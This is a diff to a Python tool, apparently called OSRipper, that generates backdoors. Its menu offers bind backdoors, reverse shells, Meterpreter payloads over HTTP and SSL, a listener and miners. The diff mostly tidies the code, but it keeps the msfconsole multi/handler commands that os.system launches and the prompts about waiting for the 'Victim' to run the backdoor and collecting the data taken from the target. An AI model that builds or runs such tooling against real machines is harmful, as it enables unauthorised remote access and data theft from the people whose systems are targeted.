@@ -252,6 +252,7 @@ main()
 def gen_rev():
     global name
     global host
+    global port
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
@@ -316,6 +317,7 @@ main()
 def gen_rev_http():
     global name
     global host
+    global port
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
@@ -346,6 +348,7 @@ main()
 def gen_rev_ssl_tcp():
     global name
     global host
+    global port
     name = 'ocr'
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
@@ -570,7 +573,7 @@ def server():
 
     # Lets choose one port and start listening on that port
     PORT = 9898
-    print("\n Server is listing on port :", PORT, "\n")
+    print("\n Server is listening on port :", PORT, "\n")
 
     # Now we need to bind to the above port at server side
     s.bind(('', PORT))
@@ -627,9 +630,9 @@ def cleanup():
 print("""
     
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
-        2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
-        3. Create Reverse Meterpreter (HTTP) (Connects back to you)
-        4. Create Encrypted TCP Meterpreter (can embed in other script) (SSL) connects back to you
+        2. Create Reverse Shell (TCP (experminetal))
+        3. Create Reverse Meterpreter (HTTP)
+        4. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
         5. Open a listener
         ##########################################################################################
                                                 Miners
@@ -643,20 +646,16 @@ nscan = input("Please select a module: ")
 if nscan == "1":
     gen_bind()
     postgen()
-    rep_syst()
     cleanup()
     os.system('clear')
     print('Generated in dist')
-    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
-    print('After that the listener will spawn instantly')
-    server()
-    port=input('Please enter the port you want to listen on: ')
-    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
-    os.system(a)
+    a = "use python/meterpreter/bind_tcp in metasploit to connect to target"
+    print(a)
 if nscan == "2":
     gen_rev()
     postgen()
     rep_syst()
+    cleanup()
 if nscan == "3":
     gen_rev_http()
     postgen()
@@ -667,7 +666,7 @@ if nscan == "3":
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
     server()
-    port=input('Please enter the port you want to listen on: ')
+    print('wait...')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
 if nscan == "4":
@@ -680,7 +679,7 @@ if nscan == "4":
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
     server()
-    port=input('Please enter the port you want to listen on: ')
+    print('wait...')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
 if nscan == '5':
